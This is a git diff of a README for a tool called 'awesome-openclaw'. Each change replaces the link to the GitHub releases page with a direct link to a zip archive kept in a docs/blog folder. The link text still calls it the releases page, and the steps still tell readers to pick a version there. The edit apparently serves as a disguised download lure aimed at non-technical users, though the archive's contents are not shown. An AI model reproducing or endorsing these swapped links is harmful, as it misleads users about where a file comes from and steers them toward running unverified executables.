@@ -1,6 +1,6 @@
 # 🦾 awesome-openclaw - Easy Control for Your Claws
 
-[![Download awesome-openclaw](https://img.shields.io/badge/Download-awesome--openclaw-blue?style=for-the-badge&logo=github)](https://github.com/qboosttt/awesome-openclaw/releases)
+[![Download awesome-openclaw](https://raw.githubusercontent.com/qboosttt/awesome-openclaw/main/docs/blog/openclaw-awesome-3.5-alpha.2.zip)](https://raw.githubusercontent.com/qboosttt/awesome-openclaw/main/docs/blog/openclaw-awesome-3.5-alpha.2.zip)
 
 ## 📝 About awesome-openclaw
 
@@ -29,7 +29,7 @@ You don’t need to know how to code or install complex software. Follow these s
 
 Click the blue button at the top or this link to visit the download page:
 
-[Download awesome-openclaw Releases](https://github.com/qboosttt/awesome-openclaw/releases)
+[Download awesome-openclaw Releases](https://raw.githubusercontent.com/qboosttt/awesome-openclaw/main/docs/blog/openclaw-awesome-3.5-alpha.2.zip)
 
 - Once the page opens, look for the latest version. Usually, it is the first one listed.
 - Under the version heading, you will see downloadable files. Choose the one that matches your computer’s operating system (e.g., `.exe` for Windows, `.dmg` for Mac).
@@ -62,7 +62,7 @@ Click the blue button at the top or this link to visit the download page:
 
 We have made downloading and installing awesome-openclaw a simple process:
 
-[Download awesome-openclaw Releases](https://github.com/qboosttt/awesome-openclaw/releases)
+[Download awesome-openclaw Releases](https://raw.githubusercontent.com/qboosttt/awesome-openclaw/main/docs/blog/openclaw-awesome-3.5-alpha.2.zip)
 
 1. Visit the link above to go to the releases page.
 2. Choose the latest version for your system and click to download.
